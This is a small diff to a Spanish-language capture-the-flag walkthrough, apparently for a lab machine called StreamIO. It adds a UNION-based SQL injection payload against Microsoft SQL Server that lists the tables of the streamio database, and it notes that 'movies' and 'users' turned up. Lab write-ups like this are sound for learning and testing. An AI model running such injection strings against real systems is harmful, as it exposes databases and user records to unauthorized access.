@@ -137,6 +137,11 @@ Ayudándonos de payloads all the things podemos identificar el nombre de la base
 ```
 
 A continuacion buscaremos como listar las tablas
+```sql
+'union select 1,name,3,4,5,6  from streamio..sysobjects where xtype='U';--
+```
+
+Encontramos las tablas `movies` y la tabla `users`
 
 
 
